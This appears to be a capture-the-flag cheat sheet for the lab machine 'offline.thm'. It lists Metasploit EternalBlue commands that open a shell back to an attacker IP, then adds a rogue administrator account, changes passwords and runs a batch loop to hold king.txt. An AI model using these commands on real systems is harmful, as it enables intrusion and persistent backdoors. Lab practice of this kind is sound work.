# Offline
1. http://offline.thm/Scarras_Super_Secret_Password.txt
2. `sudo msfconsole -q`
3. `use exploit/windows/smb/ms17_010_psexec`
4. `set RHOST offline.thm`
5. `set LHOST 10.8.85.10`
6. `exploit` and `shell`
7. `net user lomar tomarkomar /add`
8. `net localgroup administrators lomar /add`
## Defend
1. `net user poki HenEwoFYPn4Scxq97M`
2. `net user scarra Fl3fgJWQHu2M82oI40`
3.  `Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol`
```bash
@echo off
:x
attrib -a -s -r -i C:\Users\Administrator\king-server\king.txt&echo YourNickHere > C:\Users\Administrator\king-server\king.txt&attrib +a +s +r +i C:\Users\Administrator\king-server\king.txt
goto x
```
